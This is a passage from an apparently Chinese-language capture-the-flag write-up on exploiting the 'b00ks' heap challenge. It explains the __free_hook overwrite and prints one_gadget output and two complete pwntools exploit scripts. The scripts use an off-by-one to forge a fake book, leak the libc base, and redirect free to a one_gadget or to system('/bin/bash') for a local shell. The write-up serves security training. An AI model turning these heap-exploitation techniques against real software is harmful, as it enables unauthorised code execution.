&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>

<p>验证一下是对的</p>
<p><img src="image35.png"></p>
<h2 id="细说利用-onegadget-getshell"><a href="#细说利用-onegadget-getshell" class="headerlink" title="细说利用 (onegadget getshell)"></a>细说利用 (onegadget getshell)</h2><p>Libc base已经泄露了，下一步就是edit fake book1中指向book2的desc的地方改成free_hook地址，这样在edit book2的时候就可以覆盖free hook地址的内容为one gadget地址。然后在delete book的时候就会触发free hook的one gadget获取到shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ one_gadget -f /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 <span class="keyword">is</span> a valid argv</span><br><span class="line">  [r12] == NULL || r12 == NULL || r12 <span class="keyword">is</span> a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 <span class="keyword">is</span> a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx <span class="keyword">is</span> a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL || rsi <span class="keyword">is</span> a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx <span class="keyword">is</span> a valid envp</span><br></pre></td></tr></table></figure>

<p>这种覆盖hook类方法的原理是在进入free之前会先看是否有自定义的free_hook函数如果有的话，就会直接用这个free hook而不会进入libc标准的free流程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br></pre></td></tr></table></figure>

<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = ELF(<span class="string">&#x27;b00ks&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&#x27;/home/parallels/Desktop/b00ks&#x27;</span>  </span><br><span class="line">io = process(binary_path)</span><br><span class="line">pwnlib.gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#把author覆盖满</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add book 1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first idx in bookshelf: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造一个堆块，使他指向book2的堆块， book1_addr + 0x30，因为这个chunk在用所以0x30直接包含了prev_size的字段</span></span><br><span class="line">fake_book_data = p64(<span class="number">0x1</span>) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">0x8</span> ) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">0x8</span> + <span class="number">0x8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">io.sendline(fake_book_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off-by-one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#add book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Name: &#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Description: &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">name_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">name_mmap_addr = name_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(u64(desc_mmap_addr)) + <span class="number">0x41ff0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc addr : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = p64(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>])</span><br><span class="line">one_gadget = p64(libc_base + <span class="number">0xe3afe</span>) <span class="comment"># 0xe3afe + 0xe3b01 + 0xe3b04</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one gadget: &quot;</span> + <span class="built_in">hex</span>(libc_base + <span class="number">0xe3afe</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to delete:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>但是很不巧的是，onegadget是有约束相应寄存器的值需要是NULL，在我本机的环境里面这三个地址运行到时寄存器情况都不满足。</p>
<h2 id="细说利用（system）"><a href="#细说利用（system）" class="headerlink" title="细说利用（system）"></a>细说利用（system）</h2><p>所以这里需要换一个更通用的方法，预先再创建一个book3把description字段和name字段覆盖成/bin/bash\x00，接着把freehook的地址替换成system。这样在delete时候原本free chunk会直接变成system(‘/bin/bash\x00’)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = ELF(<span class="string">&#x27;b00ks&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binary_path = <span class="string">&#x27;/home/parallels/Desktop/b00ks&#x27;</span></span><br><span class="line">io = process(binary_path)</span><br><span class="line">pwnlib.gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add book 1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first idx in bookshelf: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_book_data = p64(<span class="number">0x1</span>) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> ) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">io.sendline(fake_book_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off-by-one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#add book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#add book3</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/bash\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/bash\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Name: &#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Description: &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">name_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">name_mmap_addr = name_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(u64(desc_mmap_addr)) + <span class="number">0x41ff0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc addr : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = p64(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>])</span><br><span class="line"><span class="comment"># one_gadget = p64(libc_base + 0xe3afe) # 0xe3afe + 0xe3b01 + 0xe3b04</span></span><br><span class="line"></span><br><span class="line">system = p64(libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(system)</span><br><span class="line"></span><br><span 